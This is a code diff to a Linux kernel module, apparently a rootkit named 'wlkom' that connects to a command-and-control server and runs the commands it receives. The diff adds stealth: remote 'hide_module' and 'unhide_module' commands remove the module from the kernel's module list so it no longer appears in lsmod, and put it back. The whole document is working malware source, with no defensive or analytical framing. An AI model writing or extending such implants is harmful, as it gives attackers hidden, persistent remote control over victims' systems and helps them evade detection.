@@ -5,6 +5,7 @@
 #include <linux/net.h>
 #include <linux/inet.h>
 #include <linux/fs.h>
+#include <linux/list.h>
 #include <net/sock.h>
 
 #define RETRY_DELAY 5
@@ -25,6 +26,8 @@ MODULE_PARM_DESC(c2_port,  "C2 server TCP port");
 
 static struct task_struct *conn_thread = NULL;
 static struct socket      *conn_sock   = NULL;
+static struct list_head   *module_prev = NULL;
+static bool                module_hidden = false;
 
 static void *to_sockaddr(void *ptr) { return ptr; }
 
@@ -72,6 +75,69 @@ static int send_reply(const char *reply)
     return kernel_sendmsg(conn_sock, &msg, &vec, 1, vec.iov_len);
 }
 
+static void hide_module_from_lsmod(void)
+{
+    if (module_hidden)
+        return;
+
+    module_prev = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+    module_hidden = true;
+    pr_info("wlkom: hidden from lsmod\n");
+}
+
+static void show_module_in_lsmod(void)
+{
+    if (!module_hidden)
+        return;
+
+    list_add(&THIS_MODULE->list, module_prev);
+    module_prev = NULL;
+    module_hidden = false;
+    pr_info("wlkom: visible in lsmod\n");
+}
+
+static void send_control_reply(const char *message)
+{
+    send_reply("[Exit Status: 0]\n");
+    send_reply("--- STDOUT ---\n");
+    send_reply(message);
+    send_reply("--- STDERR ---\n");
+    send_reply("--- End of Output ---\n\n");
+}
+
+static bool handle_control_command(const char *cmd)
+{
+    if (strcmp(cmd, "hide_module") == 0) {
+        if (module_hidden)
+            send_control_reply("wlkom: module already hidden from lsmod\n");
+        else {
+            hide_module_from_lsmod();
+            send_control_reply("wlkom: module hidden from lsmod\n");
+        }
+        return true;
+    }
+
+    if (strcmp(cmd, "unhide_module") == 0) {
+        if (!module_hidden)
+            send_control_reply("wlkom: module already visible in lsmod\n");
+        else {
+            show_module_in_lsmod();
+            send_control_reply("wlkom: module visible in lsmod\n");
+        }
+        return true;
+    }
+
+    if (strcmp(cmd, "module_status") == 0) {
+        if (module_hidden)
+            send_control_reply("wlkom: module hidden from lsmod\n");
+        else
+            send_control_reply("wlkom: module visible in lsmod\n");
+        return true;
+    }
+
+    return false;
+}
 
 static void execute_and_send_output(char *cmd)
 {
@@ -235,6 +301,9 @@ static int connection_thread(void *data)
             if (strlen(buf) == 0)
                 continue;
 
+            if (handle_control_command(buf))
+                continue;
+
             /* Handle processing, capturing and network streaming internally */
             execute_and_send_output(buf);
         }
@@ -281,6 +350,8 @@ static void __exit wlkom_exit(void)
         sock_release(conn_sock);
         conn_sock = NULL;
     }
+
+    show_module_in_lsmod();
 
     pr_info("wlkom: unloaded\n");
 }
